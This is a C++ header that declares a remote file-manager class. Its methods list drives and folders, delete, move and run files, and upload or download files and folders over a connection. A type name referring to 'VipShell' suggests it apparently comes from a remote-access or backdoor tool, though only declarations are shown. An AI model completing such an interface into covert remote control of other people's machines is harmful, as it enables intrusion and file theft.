#pragma once
#include "connectbase.h"
#include <string.h>
#include <vector>

class CFileManageCallBack
{
public:
	virtual void OnDownFileIng(LPCTSTR szPath, LPCTSTR szRemote, DWORD dwBig, DWORD dwLen, DWORD dwSTime) = 0;
	virtual void OnUpFileIng(LPCTSTR szPath, LPCTSTR szRemote, DWORD dwBig, DWORD dwLen, DWORD dwSTime) = 0;
};

class CServerFileManageHandle :
	public CConnectBase
{
public:
	CServerFileManageHandle(void);
	~CServerFileManageHandle(void);
public:
	typedef std::vector<structFileInfo> File_Root_Vector;
	typedef std::vector<tagVipShellFileInfo> File_Info_Vector;
public:
	bool GetRoot(File_Root_Vector* pVector);
	bool GetFileInfo(LPCWSTR szPath, File_Info_Vector* pVector );
	bool DelFile(LPCWSTR szPath);
	bool RunFile(LPCWSTR szPath, LPCWSTR szPathDir, DWORD nCmdShow);
	bool MoveFile(LPCWSTR szPath, LPCWSTR szPath1);
	bool DowndFile(LPCWSTR szPath, LPCWSTR szRemote);
	bool UpFile(LPCWSTR szPath, LPCWSTR szRemote);
	bool CreateDir(LPCWSTR szPath);
	bool DowndFileDir(LPCWSTR szPath, LPCWSTR szRemote);
	bool UpFileDir(LPCWSTR szPath, LPCWSTR szRemote);
	void SetCallBack(CFileManageCallBack* e);
protected:
	DWORD __GetFileSize(LPCTSTR szFile);
	bool __RecvFile(LPCTSTR szFile, LPCWSTR szRemote, DWORD dwSize);
	bool __SendFile(LPCTSTR szFile, LPCWSTR szRemote);
protected:
	std::wstring m_strPath;
	BYTE* m_pBuffData;
	DWORD m_dwBuffLen;
protected:
	CFileManageCallBack* m_hCallBack;
	BYTE* __NewBuff(DWORD dwLen);
};
